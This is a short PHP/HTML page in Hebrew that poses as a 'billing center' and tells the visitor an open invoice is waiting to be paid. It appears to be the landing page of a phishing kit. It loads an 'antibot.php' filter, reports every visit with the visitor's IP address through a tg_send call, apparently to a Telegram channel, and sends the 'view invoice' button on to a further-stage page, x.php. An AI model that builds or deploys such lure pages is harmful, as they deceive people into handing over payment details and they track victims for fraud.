<?php
include 'antibot.php';
tg_send("📥 <b>Visit:</b> index.php\nIP: {$_SERVER['REMOTE_ADDR']}");
?>
<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>מרכז חיובים</title>
  <style>
    body { font-family: Arial; background: #f8f9fa; margin: 0; padding: 0; direction: rtl; }
    .container { max-width: 460px; margin: 80px auto; padding: 30px 25px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); text-align: center; }
    h1 { color: #222; }
    p { color: #555; margin-bottom: 30px; }
    .button { background: #007bff; color: white; padding: 14px; width: 100%; font-size: 1.1em; border: none; border-radius: 4px; cursor: pointer; }
    .button:hover { background: #0056b3; }
  </style>
</head>
<body>
  <div class="container">
    <h1>מרכז החיובים</h1>
    <p>יש לך חשבונית פתוחה לתשלום. אנא לחץ למטה כדי להמשיך לתשלום.</p>
    <form action="x.php">
      <button class="button">צפה בחשבונית</button>
    </form>
  </div>
</body>
</html>
